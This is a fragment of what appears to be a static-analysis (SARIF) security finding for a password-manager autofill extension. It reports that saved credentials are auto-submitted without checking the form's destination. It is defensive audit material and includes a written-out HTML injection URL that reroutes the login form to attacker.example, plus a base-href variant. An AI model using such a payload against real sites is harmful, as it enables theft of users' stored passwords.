        {
          "ruleId": "CWE-522",
          "ruleIndex": 2,
          "level": "warning",
          "message": {
            "text": "Vault credentials are auto-filled and auto-submitted without checking where the form sends them (form action, formaction, base href).\n\nThe page DOM decides which form owns the filled inputs and where that form submits. The executor fills vault passwords into those inputs (content.ts:998/1022) and then clicks the submit control (content.ts:1112). It never compares form.action, the button's formAction or the document base URL with the item's origin. HTML injection on the login page, with no script needed, can therefore move the credentials to an attacker-chosen endpoint.\n\nImpact: The saved site password, plus username, Hidden fields or TOTP code, is sent to an attacker-controlled origin with no user action. The user may never have typed or seen this password.\n\nExploit scenario: bank.example's login page reflects a query parameter as HTML without escaping. A CSP blocks scripts but sets no form-action directive. The user has a Bitwarden item for bank.example and a cached recipe: fill #user and #pass, then click #login. The attacker sends https://bank.example/login?msg=<div><form action=https://attacker.example/c method=post></div>. The HTML parser keeps the injected form as its form element pointer and ignores the real <form> start tag, so the real inputs and submit button become owned by the attacker's form. Their ids, types and path do not change, so the recipe's first step is ready. Pateat fills the username and password (the password input is still type=password, so acceptsSecret passes), and every field has the same input.form. The click at content.ts:1112 then natively POSTs the credentials to attacker.example, with no user interaction (ADR 0001: matched logins run without a prompt). The same works with an injected <base href> when the real form's action is relative.\n\nPreconditions: The target site has an HTML-injection flaw on its login page (reflected or stored); script execution is not needed; The site does not restrict form submissions with a CSP form-action directive; The user has a matching vault item and an active, admitted recipe for the origin, so login runs automatically; The victim opens the attacker's URL (or views the stored injection).\n\nRecommendation: Before filling secrets and before any submitting click, resolve the submission destination: the clicked button's formAction if set, otherwise the owning form's action, using the document's base URL. Refuse when its origin, or at least its registrable domain, differs from the item's or document's origin, or differs from the origin recorded when the recipe was generated or cached. Also refuse when the inputs' form owner is not their ancestor <form> (a parser-associated owner from a dangling form), and when a <base href> points to another origin. Record the expected action origin in the recipe and observation so legitimate cross-origin SSO forms can be allowed explicitly.\n\nCWE-522. Severity MEDIUM, confidence medium."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
